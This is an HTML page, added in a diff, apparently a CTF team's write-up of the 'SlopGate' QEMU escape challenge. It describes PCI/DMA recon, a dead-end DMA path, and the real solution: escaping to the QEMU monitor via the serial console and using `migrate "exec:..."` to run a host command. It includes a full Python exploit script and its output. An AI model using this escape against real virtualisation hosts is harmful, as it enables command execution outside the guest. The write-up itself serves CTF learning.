@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>SlopGate · Kaspersky CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="The hardened SlopGate PCI device is a decoy. The serial console still drops to the QEMU monitor, and `migrate &quot;exec:...&quot;` runs a command on the host." />
+<link rel="icon" href="../images/Logo-nobg.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=2" />
+<link rel="stylesheet" href="../css/styles.css?v=16" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<div class="backdrop" aria-hidden="true"></div>
+<div class="gutters" aria-hidden="true"></div>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <span class="nav-ws">[0]</span>
+      <a href="../index.html#top" class="brand">
+        <img src="../images/Logo-nobg.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../index.html#about">about</a>
+      <a href="../index.html#focus">categories</a>
+      <a href="../index.html#results">results</a>
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">challenge</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <span class="nav-clock" id="navClock" aria-hidden="true">00:00:00</span>
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../index.html#about">about</a>
+    <a href="../index.html#focus">categories</a>
+    <a href="../index.html#results">results</a>
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">challenge</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<main class="wu-main container" id="top">
+  <div class="wu-crumbs"><a href="../index.html#top">nxt_ctfs</a> <span>/</span> <a href="../writeups.html">writeups</a> <span>/</span> <span>slopgate</span></div>
+
+  <header class="wu-head">
+    <div class="wu-head-tags">
+      <span class="wu-cat wu-cat-pwn">pwn</span>
+      <span class="wu-pts">182 pts</span>
+      <span class="wu-when">solved Aug 30, 06:14</span>
+    </div>
+    <h1>SlopGate <span>QEMU escape</span></h1>
+    <div class="wu-flagrow">
+      <span class="wu-flagrow-k">flag</span>
+      <code id="wuFlag">kaspersky{I_th1nk_w3_b0th_g0t_dumb3r_wh1l3_s0lvin6_this_t4sk}</code>
+      <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+    </div>
+  </header>
+
+  <div class="wu-layout">
+    <article class="wu-article">
+<h2 id="overview"><a class="wu-anchor" href="#overview" aria-hidden="true">#</a>Overview</h2>
+<p>SlopGate presents as a QEMU escape challenge. We&#39;re given a custom QEMU build with a
+proprietary PCI device called &quot;SlopGate&quot; (vendor ID QEMU, device ID 0x11e9). A
+minimal Linux guest boots inside QEMU; through a TCP service we authenticate via
+hashcash PoW, get a busybox shell, and must read <code>/app/flag.txt</code> on the QEMU host.</p>
+<p>The PCI device advertises itself as a &quot;stream scoring accelerator&quot; - it scores
+text streams for AI-generated slop using metrics like &quot;as an AI&quot; frequency,
+boilerplate detection, and <code>flag{</code> substring counting. It supports DMA, context
+XOR primitives, and a profile system with configurable modes.</p>
+<h2 id="initial-recon"><a class="wu-anchor" href="#initial-recon" aria-hidden="true">#</a>Initial Recon</h2>
+<h3 id="qemu-device-layout"><a class="wu-anchor" href="#qemu-device-layout" aria-hidden="true">#</a>QEMU Device Layout</h3>
+<p>The SlopGate PCI device exposes an MMIO BAR at <code>0xfebfe000</code>. Key registers:</p>
+<table>
+<thead>
+<tr>
+<th>Offset</th>
+<th>Name</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x00</td>
+<td>MAGIC</td>
+<td>Always <code>0x534c4f50</code></td>
+</tr>
+<tr>
+<td>0x0c</td>
+<td>CONTROL</td>
+<td>Enable, IRQ, Auto-process</td>
+</tr>
+<tr>
+<td>0x10</td>
+<td>Q_BASE</td>
+<td>Queue descriptor phys addr</td>
+</tr>
+<tr>
+<td>0x18</td>
+<td>Q_SIZE</td>
+<td>Queue entry count</td>
+</tr>
+<tr>
+<td>0x20</td>
+<td>Q_TAIL</td>
+<td>Enqueue by writing here</td>
+</tr>
+<tr>
+<td>0x24</td>
+<td>PROFILE_CMD</td>
+<td>Enable/rebuild context</td>
+</tr>
+<tr>
+<td>0x30</td>
+<td>PROFILE_MODE</td>
+<td>Scoring mode 0-4</td>
+</tr>
+<tr>
+<td>0x50</td>
+<td>IRQ_STATUS</td>
+<td>Complete/Error bits</td>
+</tr>
+</tbody></table>
+<p>The queue model is descriptor-based: write Q_BASE (physical address of
+guest-allocated descriptor array), Q_SIZE, then write Q_TAIL to submit work.
+Each descriptor (60 bytes) points to a request structure (44 bytes), response
+buffer, and optional stream data - all via physical addresses.</p>
+<h3 id="dma-operations"><a class="wu-anchor" href="#dma-operations" aria-hidden="true">#</a>DMA Operations</h3>
+<p>The device performs <code>pci_dma_read</code>/<code>pci_dma_write</code> to access guest-physical
+memory. All lengths are properly clamped (<code>MIN(len, SLOPGATE_MAX_STREAM)</code>),
+and the device uses a guarded bottom-half for processing, preventing
+timestamp counter attacks and MMIO re-entrancy.</p>
+<h3 id="scoring-modes"><a class="wu-anchor" href="#scoring-modes" aria-hidden="true">#</a>Scoring Modes</h3>
+<p>The scoring function is an elaborate parody of AI content detection:</p>
+<ul>
+<li>Mode 0: length_bucket + salt, light phrase matching</li>
+<li>Mode 1: heavy &quot;as an AI&quot; / &quot;I cannot&quot; penalties</li>
+<li>Mode 2: repeated window/word detection</li>
+<li>Mode 3: <code>flag{</code> substring detection × 12</li>
+<li>Mode 4: uniform multiplier across all metrics</li>
+</ul>
+<p>Context can be XOR-modified based on <code>(flags ^ stream_len ^ processed ^ score ^ ...)</code>, essentially a controlled, in-bounds byte XOR against a deterministic seed buffer.</p>
+<h2 id="the-red-herring-3-hours"><a class="wu-anchor" href="#the-red-herring-3-hours" aria-hidden="true">#</a>The Red Herring (3 hours)</h2>
+<p>I spent approximately 3 hours chasing a DMA exploitation path:</p>
+<ol>
+<li><p><strong>PCI bus master enabling</strong> - the device initially returned ERROR on
+every DMA operation. Setting PCI config space COMMAND register to <code>0x0007</code>
+(IO + MEM + BUS_MASTER) via <code>/sys/devices/pci0000:00/0000:00:02.0/config</code>
+fixed this.</p>
+</li>
+<li><p><strong>Pagemap translation</strong> - DMA uses physical addresses, not virtual. Spent
+significant time debugging assembly pagemap translation (PFN mask should be
+<code>0xFFFFFFFFFF</code> for 40-bit physical addresses, not <code>0x7FFFFFFFFFFF</code>).</p>
+</li>
+<li><p><strong>Page alignment bugs</strong> - mmap&#39;d pages aren&#39;t physically contiguous.
+Response buffers crossing page boundaries got wrong physical addresses.</p>
+</li>
+<li><p><strong>Assembly register clobbers</strong> - wrote ~15 iterations of assembly exploits
+with bugs in print routines, 64-bit immediate loading, and label numbering.</p>
+</li>
+<li><p><strong>Scanning guest RAM</strong> - scanned 0-128MB of guest physical address space
+looking for the flag. Scores were always 0x0b (noise floor: length_bucket=8</p>
+<ul>
+<li>salt=3). The flag was never in guest RAM - it&#39;s on the QEMU host filesystem.</li>
+</ul>
+</li>
+<li><p><strong>Attempted OOB DMA</strong> - tried reading above 128MB (into QEMU host memory).
+TCG properly bounds-checks against the memory region tree; reads to unmapped
+addresses returned zeros.</p>
+</li>
+<li><p><strong>Context XOR corruption</strong> - verified the XOR works (can read context,
+observe XOR effects), but it&#39;s strictly in-bounds and modifies a seed-derived
+buffer - not useful for anything beyond proof-of-concept.</p>
+</li>
+</ol>
+<h2 id="the-real-vulnerability"><a class="wu-anchor" href="#the-real-vulnerability" aria-hidden="true">#</a>The Real Vulnerability</h2>
+<p>The serial console runs without <code>-no-shutdown</code> or monitor restrictions. Simply
+sending Ctrl-A C (0x01 followed by &#39;c&#39;) drops into the <strong>QEMU Monitor (HMP)</strong>.</p>
+<pre><code>$ echo -e &#39;\x01c&#39; &gt; /dev/ttyS0
+QEMU 11.1.0 monitor - type &#39;help&#39; for more information
+(qemu) 
+</code></pre>
+<p>From the monitor, the <code>migrate</code> command supports an <code>exec:</code> URI scheme that
+spawns a subprocess and pipes migration data to/from it. Critically, <strong>the
+subprocess runs as the QEMU user on the host</strong>, and its stderr is connected to
+QEMU&#39;s stderr - which is the serial console.</p>
+<h2 id="exploit"><a class="wu-anchor" href="#exploit" aria-hidden="true">#</a>Exploit</h2>
+<p>Single command from the QEMU monitor:</p>
+<pre><code>migrate &quot;exec:cat /app/flag.txt &gt;&amp;2&quot;
+</code></pre>
+<p>This:</p>
+<ol>
+<li>Shells out to <code>/bin/sh -c &quot;cat /app/flag.txt &gt;&amp;2&quot;</code></li>
+<li>The flag is printed to stderr</li>
+<li>stderr is connected to the serial console → we see the flag</li>
+<li>The migration itself fails (qemu expects a migration stream, not &quot;kaspersky{...}&quot;),
+but the flag is already captured</li>
+</ol>
+<h3 id="full-exploit-script"><a class="wu-anchor" href="#full-exploit-script" aria-hidden="true">#</a>Full Exploit Script</h3>
+<pre><code class="language-python">import socket, subprocess, time, re, concurrent.futures
+
+IP = &quot;84.201.150.184&quot;
+PORT = 31338
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.settimeout(10)
+sock.connect((IP, PORT))
+
+# Read PoW challenge
+data = b&#39;&#39;
+while b&#39;token:&#39; not in data:
+    data += sock.recv(4096)
+
+# Solve PoW
+m = re.search(r&#39;hashcash -mb(\d+) (\S+)&#39;, data.decode())
+with concurrent.futures.ThreadPoolExecutor() as ex:
+    f = ex.submit(lambda: subprocess.run(
+        [&#39;hashcash&#39;, f&#39;-mb{m.group(1)}&#39;, m.group(2)],
+        capture_output=True, text=True, timeout=300).stdout.strip())
+    token = f.result(timeout=300)
+
+sock.sendall((token + &#39;\n&#39;).encode())
+
+# Wait for shell
+while True:
+    c = sock.recv(4096)
+    if not c: break
+    if b&#39;# &#39; in c: break
+
+# Enter QEMU monitor (Ctrl-A C)
+sock.sendall(b&#39;\x01c&#39;)
+time.sleep(0.3)
+
+# Exploit: migrate exec with flag output to stderr
+sock.sendall(b&#39;migrate &quot;exec:cat /app/flag.txt &gt;&amp;2&quot;\n&#39;)
+time.sleep(0.5)
+
+# Back to console
+sock.sendall(b&#39;\x01c&#39;)
+time.sleep(0.3)
+sock.sendall(b&#39;echo DONE\n&#39;)
+time.sleep(0.5)
+
+# Read output
+out = b&#39;&#39;
+try:
+    while True:
+        c = sock.recv(8192)
+        if not c: break
+        out += c
+except: pass
+
+print(out.decode(errors=&#39;replace&#39;))
+</code></pre>
+<p>Output:</p>
+<pre><code>migrate &quot;exec:cat /app/flag.txt &gt;&amp;2&quot;
+kaspersky{I_th1nk_w3_b0th_g0t_dumb3r_wh1l3_s0lvin6_this_t4sk}
+qemu-system-x86_64: failed to save SaveStateEntry...
+</code></pre>
+<h2 id="lessons-learned"><a class="wu-anchor" href="#lessons-learned" aria-hidden="true">#</a>Lessons Learned</h2>
+<ol>
+<li><p><strong>Check the monitor first.</strong> QEMU challenges often disable the monitor with
+<code>-monitor none</code>, but when they don&#39;t, <code>migrate exec:</code> is an instant win.
+Look for <code>-no-shutdown</code>, <code>-monitor</code>, <code>-serial mon:stdio</code> flags.</p>
+</li>
+<li><p><strong>Device complexity is distraction.</strong> The SlopGate PCI device has hundreds
+of lines of scoring logic, context XOR primitives, profile management - all
+perfectly hardened and completely irrelevant to the intended solution. CTF
+authors love this trick.</p>
+</li>
+<li><p><strong>Bus mastering matters.</strong> <code>pci_dma_read</code>/<code>pci_dma_write</code> silently fail
+without the bus master bit set in PCI config. Always check command register.</p>
+</li>
+<li><p><strong>Assembly is brittle.</strong> Writing pure assembly exploits saves transfer size
+but the debugging cost is enormous. For CTFs with reasonable binary size
+limits, use C with <code>-nostdlib</code> and syscall wrappers.</p>
+</li>
+<li><p><strong>Claude is useful for source audit.</strong> Asking Claude Code to audit the
+device source confirmed there was no OOB vulnerability, saving further
+time on the DMA dead-end.</p>
+</li>
+</ol>
+<h2 id="files"><a class="wu-anchor" href="#files" aria-hidden="true">#</a>Files</h2>
+<ul>
+<li><code>slopgate-core.c</code>, QEMU device: scoring, context, DMA</li>
+<li><code>slopgate-pci.c</code>, PCI transport: MMIO, queue management</li>
+<li><code>slopgate.h</code>, Register definitions, descriptor/request/response layouts</li>
+<li><code>run.sh</code>, QEMU command line (no <code>-monitor none</code>!)</li>
+<li><code>Dockerfile</code>, Flag at <code>/app/flag.txt</code>, chmod 0444</li>
+</ul>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#overview">Overview</a></li><li><a href="#initial-recon">Initial Recon</a></li><li><a href="#the-red-herring-3-hours">The Red Herring (3 hours)</a></li><li><a href="#the-real-vulnerability">The Real Vulnerability</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#lessons-learned">Lessons Learned</a></li><li><a href="#files">Files</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev wu-pager-index" href="../writeups.html"><span class="wu-pager-dir">Index</span><span class="wu-pager-name">All writeups</span></a>
+    <a class="wu-pager-link wu-pager-next" href="lumberjack.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Lumberjack</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/Logo-nobg.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Navigate</h4>
+      <a href="../index.html#about">About</a>
+      <a href="../index.html#focus">Categories</a>
+      <a href="../index.html#results">Results</a>
+      <a href="../writeups.html">Writeups</a>
+      <a href="../index.html#join">Join</a>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=16"></script>
+</body>
+</html>
